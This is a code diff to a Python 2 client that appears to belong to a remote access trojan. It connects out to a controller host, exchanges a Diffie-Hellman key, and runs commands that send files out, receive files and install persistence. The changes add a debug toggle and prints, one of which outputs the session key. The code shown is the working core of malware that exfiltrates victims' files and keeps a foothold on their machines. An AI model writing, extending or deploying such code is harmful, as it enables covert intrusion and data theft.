@@ -11,6 +11,8 @@ import subprocess
 import struct
 import sys
 
+from binascii import hexlify
+
 from core import common
 # from core import crypto
 from core import persistence
@@ -30,12 +32,13 @@ FB_KEY  = '82e672ae054aa4de6f042c888111686a'
 
 
 def main():
+    debug = False
     s = socket.socket()
     s.connect((HOST, PORT))
     
     DHKEY = diffiehellman(s)
     # debug: confirm DHKEY matches
-    # print binascii.hexlify(DHKEY)
+    if debug: print hexlify(DHKEY)
     
     while True:
         data = s.recv(1024)
@@ -61,20 +64,26 @@ def main():
         elif cmd == 'download':
             for fname in action.split():
                 fname = fname.strip()
-                #print 'requested file: {}'.format(fname)
+                if debug: print 'requested file: {}'.format(fname)
                 sendfile(s, fname, DHKEY)
 
         # receive file
         elif cmd == 'upload':
             for fname in action.split():
                 fname = fname.strip()
-                #print 'receiving file: {}'.format(fname)
+                if debug: print 'receiving file: {}'.format(fname)
                 recvfile(s, fname, DHKEY)
 
         # regenerate DH key (dangerous! may cause connection loss)
         # available in case a fallback occurs or you suspect evesdropping
         elif cmd == 'rekey':
             DHKEY = diffiehellman(s)
+            # debug: confirm DHKEY matches
+            if debug: print "Diffie Key: {}".format(hexlify(DHKEY))
+
+        elif cmd == 'debug':
+            debug = not debug
+            print "Debug mode set to {}".format(bool(debug))
 
         # apply persistence mechanism
         elif cmd == 'persistence':
@@ -83,6 +92,7 @@ def main():
                 results = 'Persistence successful, {}.'.format(details)
             else:
                 results = 'Persistence unsuccessful, {}.'.format(details)
+            if debug: print results
             s.send(encrypt(results, DHKEY))
 
 
